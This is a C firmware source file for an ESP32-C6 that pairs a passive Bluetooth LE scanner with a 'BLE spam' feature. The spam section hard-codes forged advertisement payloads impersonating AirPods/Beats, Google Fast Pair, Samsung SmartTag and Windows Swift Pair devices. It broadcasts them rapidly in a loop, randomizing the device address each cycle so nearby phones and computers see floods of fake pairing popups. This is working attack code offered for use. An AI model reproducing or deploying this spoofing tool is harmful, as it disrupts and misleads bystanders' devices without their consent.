/*
 * nesso_ble.c — BLE scanner + spam for the ESP32-C6.
 *
 * Uses NimBLE via ESP-IDF's bt component.
 */

#include <string.h>
#include <stdlib.h>

#include "esp_check.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_bt.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/util/util.h"

#include "nesso_ble.h"

static const char *TAG = "nesso_ble";

static bool s_initted = false;
static bool s_spam_running = false;
static TaskHandle_t s_spam_task = NULL;
static nesso_ble_spam_type_t s_spam_type;

/* -------------------- scan state -------------------- */

static nesso_ble_scan_result_t *s_scan_out = NULL;
static SemaphoreHandle_t s_scan_done = NULL;

/* -------------------- NimBLE host task -------------------- */

static void ble_host_task(void *param)
{
    (void)param;
    nimble_port_run();
    nimble_port_freertos_deinit();
}

static void ble_on_sync(void)
{
    /* Use best available address. */
    ble_hs_util_ensure_addr(0);
    ESP_LOGI(TAG, "BLE host synced");
}

static void ble_on_reset(int reason)
{
    ESP_LOGW(TAG, "BLE host reset: reason=%d", reason);
}

/* -------------------- init -------------------- */

esp_err_t nesso_ble_init(void)
{
    if (s_initted) return ESP_OK;

    /* Release classic BT memory — we only need BLE. */
    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT));

    esp_err_t err = nimble_port_init();
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "nimble_port_init: %s", esp_err_to_name(err));
        return err;
    }

    ble_hs_cfg.sync_cb = ble_on_sync;
    ble_hs_cfg.reset_cb = ble_on_reset;

    nimble_port_freertos_init(ble_host_task);

    /* Wait for sync. */
    for (int i = 0; i < 50 && !ble_hs_synced(); ++i) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (!ble_hs_synced()) {
        ESP_LOGE(TAG, "BLE host did not sync in 5s");
        return ESP_ERR_TIMEOUT;
    }

    s_initted = true;
    ESP_LOGI(TAG, "BLE ready");
    return ESP_OK;
}

esp_err_t nesso_ble_deinit(void)
{
    if (!s_initted) return ESP_OK;
    if (s_spam_running) nesso_ble_spam_stop();
    nimble_port_stop();
    nimble_port_deinit();
    s_initted = false;
    return ESP_OK;
}

bool nesso_ble_is_ready(void) { return s_initted; }

/* -------------------- scanner -------------------- */

static int find_device(const nesso_ble_scan_result_t *r, const uint8_t *addr)
{
    for (size_t i = 0; i < r->count; ++i) {
        if (memcmp(r->devices[i].addr, addr, 6) == 0) return (int)i;
    }
    return -1;
}

static int scan_event_cb(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type == BLE_GAP_EVENT_DISC) {
        const struct ble_gap_disc_desc *desc = &event->disc;
        if (!s_scan_out) return 0;

        int idx = find_device(s_scan_out, desc->addr.val);
        if (idx >= 0) {
            /* Update RSSI. */
            if (desc->rssi > s_scan_out->devices[idx].rssi) {
                s_scan_out->devices[idx].rssi = desc->rssi;
            }
            return 0;
        }

        if (s_scan_out->count >= BLE_SCAN_MAX_DEVICES) return 0;

        nesso_ble_device_t *dev = &s_scan_out->devices[s_scan_out->count];
        memcpy(dev->addr, desc->addr.val, 6);
        dev->rssi = desc->rssi;
        dev->addr_type = desc->addr.type;
        dev->name[0] = '\0';

        /* Try to extract device name from adv data. */
        struct ble_hs_adv_fields fields;
        if (ble_hs_adv_parse_fields(&fields, desc->data, desc->length_data) == 0) {
            if (fields.name != NULL && fields.name_len > 0) {
                size_t n = fields.name_len < 19 ? fields.name_len : 19;
                memcpy(dev->name, fields.name, n);
                dev->name[n] = '\0';
            }
        }

        s_scan_out->count++;

    } else if (event->type == BLE_GAP_EVENT_DISC_COMPLETE) {
        if (s_scan_done) xSemaphoreGive(s_scan_done);
    }
    return 0;
}

esp_err_t nesso_ble_scan(uint32_t duration_sec, nesso_ble_scan_result_t *out)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (!out) return ESP_ERR_INVALID_ARG;

    /* Stop spam if running — can't scan and advertise simultaneously. */
    if (s_spam_running) nesso_ble_spam_stop();

    memset(out, 0, sizeof(*out));
    s_scan_out = out;

    if (!s_scan_done) s_scan_done = xSemaphoreCreateBinary();

    struct ble_gap_disc_params scan_params = {
        .itvl = 0,     /* use defaults */
        .window = 0,
        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .limited = 0,
        .passive = 1,  /* passive scan — don't send scan requests */
        .filter_duplicates = 0,
    };

    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, duration_sec * 1000,
                          &scan_params, scan_event_cb, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gap_disc failed: %d", rc);
        s_scan_out = NULL;
        return ESP_FAIL;
    }

    /* Wait for scan to complete. */
    xSemaphoreTake(s_scan_done, pdMS_TO_TICKS(duration_sec * 1000 + 2000));
    s_scan_out = NULL;

    ESP_LOGI(TAG, "scan complete: %zu devices", out->count);
    return ESP_OK;
}

/* -------------------- spam -------------------- */

/*
 * Apple Proximity Pairing — triggers AirPod/Beats popup on iPhones.
 * Manufacturer-specific data with Apple company ID (0x004C).
 */
static const uint8_t s_apple_adv[][31] = {
    /* AirPods Pro */
    { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75,
      0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
    /* AirPods */
    { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x01, 0x20, 0x75,
      0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
    /* Beats Studio */
    { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75,
      0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
};
#define APPLE_ADV_COUNT 3

/*
 * Google Fast Pair — triggers pairing popup on Android.
 * Uses service data UUID 0xFE2C.
 */
static const uint8_t s_google_adv[] = {
    0x03, 0x03, 0x2c, 0xfe,   /* 16-bit UUID list: Fast Pair */
    0x06, 0x16, 0x2c, 0xfe,   /* Service data for Fast Pair */
    0x00, 0x01, 0x02,          /* Model ID (fake) */
};
#define GOOGLE_ADV_LEN sizeof(s_google_adv)

/*
 * Samsung BLE — triggers SmartTag notification.
 */
static const uint8_t s_samsung_adv[] = {
    0x02, 0x01, 0x06,                     /* Flags */
    0x0f, 0xff, 0x75, 0x00,               /* Samsung company ID */
    0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
    0x03, 0x00, 0x00, 0x00, 0x00, 0x00,
};
#define SAMSUNG_ADV_LEN sizeof(s_samsung_adv)

/*
 * Windows Swift Pair — triggers pairing popup on Windows 10/11.
 * Microsoft company ID (0x0006) with Swift Pair beacon.
 */
static const uint8_t s_windows_adv[] = {
    0x02, 0x01, 0x06,
    0x06, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80,  /* Microsoft Swift Pair */
};
#define WINDOWS_ADV_LEN sizeof(s_windows_adv)

static void set_random_addr(void)
{
    uint8_t addr[6];
    for (int i = 0; i < 6; ++i) addr[i] = (uint8_t)(esp_random() & 0xFF);
    addr[0] |= 0xC0;  /* random static address */
    ble_hs_id_set_rnd(addr);
}

static esp_err_t send_adv(const uint8_t *data, size_t len, uint32_t duration_ms)
{
    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_NON,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min  = 0x20,  /* 20ms */
        .itvl_max  = 0x40,  /* 40ms — fast for visibility */
    };

    set_random_addr();

    int rc = ble_gap_adv_set_data(data, (int)len);
    if (rc != 0) return ESP_FAIL;

    rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, duration_ms,
                           &adv_params, NULL, NULL);
    if (rc != 0) return ESP_FAIL;

    vTaskDelay(pdMS_TO_TICKS(duration_ms));
    ble_gap_adv_stop();
    return ESP_OK;
}

static void spam_task(void *arg)
{
    (void)arg;
    int variant = 0;

    while (s_spam_running) {
        switch (s_spam_type) {
        case BLE_SPAM_APPLE:
            send_adv(s_apple_adv[variant % APPLE_ADV_COUNT],
                     sizeof(s_apple_adv[0]), 100);
            variant++;
            break;

        case BLE_SPAM_SAMSUNG:
            send_adv(s_samsung_adv, SAMSUNG_ADV_LEN, 100);
            break;

        case BLE_SPAM_GOOGLE:
            send_adv(s_google_adv, GOOGLE_ADV_LEN, 100);
            break;

        case BLE_SPAM_WINDOWS:
            send_adv(s_windows_adv, WINDOWS_ADV_LEN, 100);
            break;

        case BLE_SPAM_ALL:
        default:
            /* Cycle through all types. */
            switch (variant % 4) {
            case 0: send_adv(s_apple_adv[esp_random() % APPLE_ADV_COUNT],
                             sizeof(s_apple_adv[0]), 80); break;
            case 1: send_adv(s_samsung_adv, SAMSUNG_ADV_LEN, 80); break;
            case 2: send_adv(s_google_adv, GOOGLE_ADV_LEN, 80); break;
            case 3: send_adv(s_windows_adv, WINDOWS_ADV_LEN, 80); break;
            }
            variant++;
            break;
        }

        /* Randomize the BLE address each cycle to appear as different devices. */
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    s_spam_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t nesso_ble_spam_start(nesso_ble_spam_type_t type)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (s_spam_running) return ESP_OK;

    s_spam_type = type;
    s_spam_running = true;

    BaseType_t ok = xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &s_spam_task);
    if (ok != pdPASS) {
        s_spam_running = false;
        return ESP_ERR_NO_MEM;
    }

    static const char *names[] = { "Apple", "Samsung", "Google", "Windows", "ALL" };
    ESP_LOGI(TAG, "BLE spam started: %s", names[type]);
    return ESP_OK;
}

esp_err_t nesso_ble_spam_stop(void)
{
    if (!s_spam_running) return ESP_OK;
    s_spam_running = false;
    ble_gap_adv_stop();
    for (int i = 0; i < 20 && s_spam_task; ++i) vTaskDelay(pdMS_TO_TICKS(50));
    ESP_LOGI(TAG, "BLE spam stopped");
    return ESP_OK;
}

bool nesso_ble_spam_is_active(void) { return s_spam_running; }
